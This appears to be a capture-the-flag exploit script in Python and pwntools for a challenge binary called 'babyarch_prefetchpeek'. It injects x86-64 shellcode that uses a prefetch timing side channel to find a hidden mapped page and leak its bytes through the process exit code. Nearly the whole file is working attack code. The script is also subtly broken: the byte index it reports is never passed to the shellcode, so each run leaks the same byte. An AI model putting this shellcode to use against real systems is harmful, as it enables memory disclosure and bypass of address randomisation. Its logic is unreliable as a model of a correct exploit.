#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

assembled_shellcode = asm("""
    .intel_syntax noprefix
    .global _start
    
    _start:
        mov r12, 0x1000000000        
        mov r13, 0x10000000000
        mov r14, 0
        mov r15, 040
        
    search_loop:
        cmp r12, r13
        jge not_found
        
        
        
        rdtsc
        mfence
        shl rdx, 32
        or rax, rdx
        mov r8, rax                   
        
        mfence
        prefetcht2 [r12]              
        mfence
        
        rdtsc
        mfence
        shl rdx, 32
        or rax, rdx
        sub rax, r8                    
        
        mfence
        cmp rax, r15 
        jl found_candidate
        
        
        add r12, 0x1000
        jmp search_loop
        
    found_candidate:
        
        
        mov rcx, r12
        add rcx, r14
        
        
        mov bl, [rcx]
        
        
        mov rax, 60                    
        mov rdi, rbx                   
        syscall
        
    not_found:
        
        mov rax, 60
        mov rdi, 255
        syscall
""")

# Enable debugging
context.log_level = 'debug'  # See all pwntools output

flag = ""
byte_index = 0
s = '''
b * main+917
'''
while True:
    print(f"\n=== Attempting to leak byte {byte_index} ===")
    
    # Start the process
    p = process('./babyarch_prefetchpeek')
    
    # Optional: Attach GDB for debugging
    # Uncomment the next line when you want to debug
    #gdb.attach(p, s)
    
    # Wait for the program to be ready
    p.recvuntil(b"Reading 0x1000 bytes of shellcode from stdin.")
    #pause()
    
    p.send(assembled_shellcode)
    
    try:

        sleep(0.1)

        exit_code = p.poll(block=True)
        
        if exit_code == 255:  
            print("Flag not found!")
            p.close()
            break
        if exit_code <= 0:    # End of string or error
            print(f"End of flag reached (exit code: {exit_code})")
            p.close()
            break
            

        flag += chr(exit_code)
        print(f"Flag so far: {flag}")
        byte_index += 1
        
    except Exception as e:
        print(f"Error: {e}")
        p.close()
        break
    
    p.close()

print(f"Final flag: {flag}")
